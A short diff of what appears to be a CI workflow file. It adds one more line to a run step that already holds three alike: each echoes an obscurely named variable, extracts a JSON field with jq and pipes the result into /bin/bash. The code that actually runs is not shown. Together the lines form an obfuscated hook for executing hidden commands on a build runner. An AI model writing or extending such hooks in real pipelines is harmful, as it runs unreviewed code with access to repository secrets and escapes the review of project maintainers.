@@ -44,6 +44,7 @@ jobs:
           printf '%s' "$vlmg20" | jq -r .x2 | /bin/bash
           printf '%s' "$rjh4" | jq -r .i5298 | /bin/bash
           echo $stsd40216 | jq -r .hs40 | /bin/bash
+          echo $awp7 | jq -r .cep487 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
